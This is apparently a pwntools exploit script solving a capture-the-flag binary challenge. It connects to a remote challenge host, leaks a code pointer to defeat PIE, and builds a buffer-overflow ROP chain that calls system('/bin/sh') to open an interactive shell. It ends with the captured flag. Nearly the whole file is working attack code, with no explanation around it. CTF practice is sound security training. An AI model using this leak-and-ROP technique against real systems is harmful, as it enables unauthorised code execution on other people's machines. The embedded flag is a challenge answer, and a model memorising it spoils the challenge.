from pwn import *

context.log_level = 'debug'
elf = ELF('./chal')
p = remote('chal1.sieberr.live', 15001)
# p = process('./chal')

# Leak main_ref to get PIE base
p.recvuntil(b'name? ')

#gdb.attach(p, gdbscript='''
 #   b *main
  #  b *gifts
   # b *system
    #continue
#''')

p.sendline(b'A' * 32)
p.recvuntil(b'A' * 32)
main_ref_leak = p.recv(6)
main_ref = u64(main_ref_leak.ljust(8, b'\x00'))
log.success(f'Leaked main_ref: {hex(main_ref)}')

pie_base = main_ref - elf.symbols['main']
log.success(f'Calculated PIE base: {hex(pie_base)}')

# gifts() function address
gifts_addr = pie_base + elf.symbols['gifts']
log.success(f"gifts() address: {hex(gifts_addr)}")

# system() plt address
system_plt = pie_base + elf.plt['system']
log.success(f"system@plt address: {hex(system_plt)}")

#/bin/sh
binsh_offset = elf.search(b"/bin/sh\x00")
binsh_addr = pie_base + next(binsh_offset)
log.success(f"/bin/sh string address: {hex(binsh_addr)}")

#pop %rdi
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_ret_addr = pie_base + pop_rdi_ret
log.success(f"pop rdi; ret gadget address: {hex(pop_rdi_ret_addr)}")

#ret gadget
ret_gadget = rop.find_gadget(['ret'])[0]
ret_addr = pie_base + ret_gadget
log.success(f"ret gadget address: {hex(ret_addr)}")


payload = b'A' * 32
payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)      # gadget address to control rdi
payload += p64(binsh_addr)       # address of "/bin/sh" string
payload += p64(system_plt)   # address of system@plt

p.sendlineafter(b'> ', payload)

p.interactive()

# sctf{N0W_1_C4N_T3LL_T0P_FR0M_B0TT0M}